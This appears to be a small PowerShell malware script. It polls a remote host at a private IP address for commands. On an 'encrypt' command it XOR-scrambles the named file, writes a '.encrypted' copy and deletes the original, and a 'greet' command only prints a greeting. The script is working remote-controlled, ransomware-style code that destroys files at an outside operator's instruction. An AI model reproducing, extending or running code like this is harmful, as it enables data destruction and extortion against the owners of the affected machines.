### Global Variables ###

    $commandResource = 'http://172.17.212.145/jesus.html' # Resource to be Consulted
    $request = Invoke-WebRequest $commandResource         # Get the Resource
    $command = $request.Content.Split(' ')                # Get Command Parts
    [System.Collections.ArrayList] $encryptedFile = @()   # File's Bytes

    switch ($command[0]) {
        
        "encrypt" { # encrypt filePath

            $fileAbsolutePath = Resolve-Path $command[1] # Get File's Absolute Path
            $fileBytes = (Format-Hex $fileAbsolutePath).Bytes # Get File's Bytes
            $fileBytes | foreach { $encryptedFile.Add(($_ -bxor 25)) } # Apply XOR to every byte

            [System.IO.File]::WriteAllBytes("$fileAbsolutePath" + ".encrypted", $encryptedFile) # Create Encrypted File
            Remove-Item $fileAbsolutePath # Delete Original File

        }

        "greet" { echo "Hola Como Andamos" }

    }